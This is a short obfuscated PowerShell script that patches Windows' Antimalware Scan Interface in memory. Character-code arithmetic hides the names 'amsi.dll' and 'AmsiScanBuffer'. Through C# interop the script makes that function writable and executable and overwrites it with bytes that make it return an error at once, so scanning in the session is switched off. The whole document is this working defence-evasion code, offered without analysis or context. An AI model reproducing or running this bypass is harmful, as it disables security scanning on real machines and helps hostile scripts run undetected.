$tWdwQa8qjrC = @"
using System;
using System.Runtime.InteropServices;
public class tWdwQa8qjrC {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr lst1IbwB, string zUsMzQRZr);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr WCrtqHFvJ4, UIntPtr aXrv7qKYPRd, uint xjQl372HTvOhgWx, out uint w_HAumtMEgdrG);
}
"@

Add-Type $tWdwQa8qjrC

$jqcFWY1zcQ = [tWdwQa8qjrC]::LoadLibrary("$([CHAr](65+32)+[CHAr]([byTE]0x6d)+[cHar]([bYtE]0x73)+[ChAr](105*62/62)+[cHAr](46*34/34)+[ChAr](83+17)+[cHAR](108*96/96)+[ChAR]([BYTe]0x6c))")
$E7YuiZoqJ3AwI0Zwyu = [tWdwQa8qjrC]::GetProcAddress($jqcFWY1zcQ, "$([ChAR]([BYTE]0x41)+[ChAr](109)+[chaR](115)+[CHaR]([bytE]0x69)+[cHar]([ByTE]0x53)+[ChaR]([Byte]0x63)+[char]([BYTE]0x61)+[chAr]([ByTe]0x6e)+[CHAR]([BYTe]0x42)+[CHar](117)+[chaR](102*18/18)+[ChaR]([bYte]0x66)+[cHAr]([ByTe]0x65)+[chaR]([bYTE]0x72))")
$p = 0
[tWdwQa8qjrC]::VirtualProtect($E7YuiZoqJ3AwI0Zwyu, [uint32]5, 0x40, [ref]$p)
$YEzw = "0xB8"
$lKW0CwxbJ3t = "0x57"
$TQPxOf = "0x00"
$YBOCW8Nf = "0x07"
$VY5niZ = "0x80"
$_fMINkLUNsJISZ3m = "0xC3"
$K9ITPz9fX_PXU8Clh1PT = [Byte[]] ($YEzw,$lKW0CwxbJ3t,$TQPxOf,$YBOCW8Nf,+$VY5niZ,+$_fMINkLUNsJISZ3m)
[System.Runtime.InteropServices.Marshal]::Copy($K9ITPz9fX_PXU8Clh1PT, 0, $E7YuiZoqJ3AwI0Zwyu, 6)